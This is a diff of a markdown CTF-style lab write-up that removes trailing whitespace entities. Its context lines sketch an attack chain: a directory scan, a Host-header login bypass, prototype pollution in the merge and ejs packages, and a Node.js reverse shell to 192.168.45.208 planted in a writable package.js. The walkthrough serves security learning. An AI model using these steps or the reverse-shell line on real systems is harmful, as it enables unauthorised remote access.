@@ -76,7 +76,7 @@ Port 8000 required credentials to view, and its likely that the source code we f
 
 <figure><img src="../../../.gitbook/assets/image (3750).png" alt=""><figcaption></figcaption></figure>
 
-I first did a `feroxbuster` scan on the port 80 website, since we couldn't do anything without the credentials for the port 8000 website.&#x20;
+I first did a `feroxbuster` scan on the port 80 website, since we couldn't do anything without the credentials for the port 8000 website.
 
 ```
 $ feroxbuster -u http://192.168.183.184
@@ -181,7 +181,7 @@ This can be bypassed by setting the `Host` header to `localhost` since the Nginx
 
 <figure><img src="../../../.gitbook/assets/image (2845).png" alt=""><figcaption></figcaption></figure>
 
-With this, we can login and view the port 8000 service.&#x20;
+With this, we can login and view the port 8000 service.
 
 <figure><img src="../../../.gitbook/assets/image (1765).png" alt=""><figcaption></figcaption></figure>
 
@@ -201,13 +201,13 @@ $ cat package.json
 } 
 ```
 
-The `ejs` package is vulnerable to RCE using Prototype Pollution, while the `merge` package is vulnerable to Prototype Pollution.&#x20;
+The `ejs` package is vulnerable to RCE using Prototype Pollution, while the `merge` package is vulnerable to Prototype Pollution.
 
 {% embed url="https://security.snyk.io/package/npm/ejs/3.1.6" %}
 
 {% embed url="https://security.snyk.io/package/npm/merge/2.1.0" %}
 
-The vulnerable function would be the `post_status` one since it uses the `recursive` function from `merge`.&#x20;
+The vulnerable function would be the `post_status` one since it uses the `recursive` function from `merge`.
 
 ```javascript
 app.post("/change_status", (req, res) => {
@@ -320,7 +320,7 @@ It uses a `package.js` file from `/var/www/node`, a directory we have write acce
 require('child_process').exec("bash -c 'bash -i >& /dev/tcp/192.168.45.208/80 0>&1'")
 ```
 
-Then, we can just wait for the shell to execute.&#x20;
+Then, we can just wait for the shell to execute.
 
 <figure><img src="../../../.gitbook/assets/image (1771).png" alt=""><figcaption></figcaption></figure>
 
